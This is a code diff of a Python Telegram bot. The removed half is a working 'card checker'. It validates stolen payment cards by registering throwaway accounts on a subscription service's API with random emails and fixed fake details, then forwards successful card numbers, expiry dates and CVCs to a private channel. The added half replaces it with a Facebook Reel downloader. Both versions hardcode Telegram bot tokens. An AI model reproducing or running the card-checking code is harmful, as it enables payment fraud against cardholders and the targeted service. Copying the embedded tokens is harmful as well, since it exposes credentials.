@@ -1,118 +1,55 @@
 import telebot
-import requests
-import random
-import string
-import urllib.parse
+import yt_dlp
+import os
 
-POCKETPA_BOT_TOKEN = "7194711538:AAG0jGdJD7umr6_sWXqMWPyeps5LyhQ6gSU"
-CHANNEL_ID = -1002170961342
-bot = telebot.TeleBot(POCKETPA_BOT_TOKEN)
+BOT_TOKEN = "7194711538:AAF7dBt4TkfQ67TpgrAMUfK63rIscUXGjnE"
+bot = telebot.TeleBot(BOT_TOKEN)
 
-def generate_random_email():
-    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
-    return f"{name}@gmail.com"
+DOWNLOAD_FOLDER = "downloads"
+os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)
 
-def parse_card_input(text):
-    parts = text.strip().split('|')
-    if len(parts) != 4:
-        return None
-    card_number, exp_month, exp_year, cvc = map(str.strip, parts)
-    if not (card_number.isdigit() and cvc.isdigit() and exp_month.isdigit() and (len(exp_year) == 2 or len(exp_year) == 4)):
-        return None
-    return card_number, exp_month.zfill(2), exp_year, cvc
+MAX_FILE_SIZE = 50 * 1024 * 1024  # 50 MB Telegram limit
 
-@bot.message_handler(commands=['start'])
-def start_handler(message):
-    bot.send_message(message.chat.id,
-        "💳 PocketPA Card Checker\n"
-        "Send card in this format:\n"
-        "CardNumber|MM|YY|CVC\n"
-        "CardNumber|MM|YYYY|CVC\n"
-        "Example:\n4242424242424242|05|25|123"
+def download_facebook_reel(url):
+    ydl_opts = {
+        'format': 'best',
+        'outtmpl': os.path.join(DOWNLOAD_FOLDER, '%(id)s.%(ext)s'),
+        'quiet': True,
+        'no_warnings': True,
+    }
+    with yt_dlp.YoutubeDL(ydl_opts) as ydl:
+        info = ydl.extract_info(url, download=True)
+        filename = ydl.prepare_filename(info)
+        return filename
+
+@bot.message_handler(commands=['start', 'help'])
+def send_welcome(message):
+    bot.reply_to(
+        message,
+        "Send me a Facebook Reel URL and I will download the video for you! (Max 50MB)"
     )
 
-@bot.message_handler(func=lambda m: True)
-def card_handler(message):
+@bot.message_handler(func=lambda message: True)
+def handle_message(message):
+    url = message.text.strip()
+    if not ("facebook.com/reel" in url or "facebook.com/watch" in url):
+        bot.reply_to(message, "Please send a valid Facebook Reel URL.")
+        return
+
+    bot.reply_to(message, "Downloading your Reel, please wait...")
+
     try:
-        parsed = parse_card_input(message.text)
-        if not parsed:
-            return bot.reply_to(message, "❌ Invalid format. Use: CardNumber|MM|YY|CVC or CardNumber|MM|YYYY|CVC")
+        filepath = download_facebook_reel(url)
+        filesize = os.path.getsize(filepath)
+        if filesize > MAX_FILE_SIZE:
+            bot.reply_to(message, "Sorry, the Reel is too large to send via Telegram (over 50MB).")
+            os.remove(filepath)
+            return
 
-        card_number, exp_month, exp_year, cvc = parsed
-        if len(exp_year) == 2:
-            exp_year = "20" + exp_year
-
-        email = generate_random_email()
-        phone = "+13144740467"
-        zip_code = "BA3 HAL"
-
-        with requests.Session() as session:
-            # Step 1: Get CSRF cookie and session cookies
-            session.get(
-                "https://api.pocketpa.com/sanctum/csrf-cookie",
-                headers={
-                    "ppa-locale": "en",
-                    "accept": "application/json",
-                    "origin": "https://app.pocketpa.com",
-                    "referer": "https://app.pocketpa.com/"
-                }
-            )
-            raw_token = session.cookies.get("XSRF-TOKEN", "")
-            xsrf_token = urllib.parse.unquote(raw_token)
-
-            payload = {
-                "name": "Telegram User",
-                "email": email,
-                "phone": phone,
-                "country_code": "1",
-                "password": "TempPass123!",
-                "locale": "en",
-                "plan_id": "price_1NK6JMDuSyQMYtIMfauDnsfM",
-                "zip_code": zip_code,
-                "is_affiliate": False,
-                "card": {
-                    "number": card_number,
-                    "exp_month": exp_month,
-                    "exp_year": exp_year[-2:],
-                    "cvc": cvc
-                }
-            }
-
-            response = session.post(
-                "https://api.pocketpa.com/api/register",
-                json=payload,
-                headers={
-                    "x-xsrf-token": xsrf_token,
-                    "ppa-locale": "en",
-                    "accept": "application/json",
-                    "content-type": "application/json",
-                    "origin": "https://app.pocketpa.com",
-                    "referer": "https://app.pocketpa.com/"
-                }
-            )
-
-            try:
-                resp_json = response.json()
-            except ValueError:
-                resp_json = response.text
-
-            if (isinstance(resp_json, dict) and (resp_json.get("status") == "success" or response.status_code == 201)):
-                success_msg = (
-                    f"✅ PocketPA Payment Successful!\n"
-                    f"Card: {card_number} | {exp_month}/{exp_year} | {cvc}\n"
-                    f"Email: {email}\n"
-                    f"Full Response:\n{resp_json}"
-                )
-                bot.reply_to(message, "✅ Your Card Was Added")
-                bot.send_message(CHANNEL_ID, success_msg)
-            else:
-                if isinstance(resp_json, dict):
-                    error_message = resp_json.get('message', str(resp_json))
-                else:
-                    error_message = resp_json
-                bot.reply_to(message, f"❌ Declined or error: {error_message}")
-
+        with open(filepath, 'rb') as video_file:
+            bot.send_video(message.chat.id, video_file)
+        os.remove(filepath)
     except Exception as e:
-        bot.reply_to(message, f"⚠️ Error: {str(e)}")
+        bot.reply_to(message, f"Failed to download or send Reel: {e}")
 
-bot.infinity_polling()
+bot.polling()
